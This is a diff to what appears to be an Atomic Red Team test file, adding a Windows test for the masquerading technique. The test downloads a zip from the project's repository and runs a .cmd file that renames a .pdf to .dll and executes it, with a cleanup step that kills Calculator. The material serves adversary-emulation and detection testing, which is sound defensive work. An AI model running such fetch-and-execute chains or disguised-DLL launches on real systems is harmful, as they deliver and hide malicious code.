@@ -12,3 +12,29 @@ atomic_tests:
       start %ALLUSERSPROFILE%\cmd.exe
     cleanup_command: del %ALLUSERSPROFILE%\cmd.exe >nul 2>&1
     name: command_prompt
+- name: Malware Masquerading and Execution from Zip File
+  description: Upon the unzipping of the file, the .cmd file executes and changes the .pdf to .dll and executes the dll
+  supported_platforms:
+  - windows
+  input_arguments:
+    url:
+      description: Location of zip file
+      type: Url
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1036/bin/T1036.zip
+    file:
+      description: cmd file that performs execution
+      type: Path
+      default: C:\Users\$env:username\Downloads\T1036\README.cmd
+  prereq_command: |
+    Invoke-WebRequest -outputFile "C:\Users\$env:username\Downloads\T1036.zip" #{url}
+    Expand-Archive -Path C:\Users\$env:username\Downloads\T1036.zip -DestinationPath C:\Users\$env:username\Downloads
+  get_prereq_command: |
+    if (Test-Path C:\Users\$env:username\Downloads\T1036.zip) {exit 0} else {exit 1}
+  executor:
+    command: |-
+      cd $(split-path -path #{file})
+      cmd /c #{file}
+    cleanup_command: |-
+      taskkill /IM Calculator.exe /f
+      Remove-Item C:\Users\$env:username\Downloads\T1036 -recurse -ErrorAction Ignore
+    name: powershell
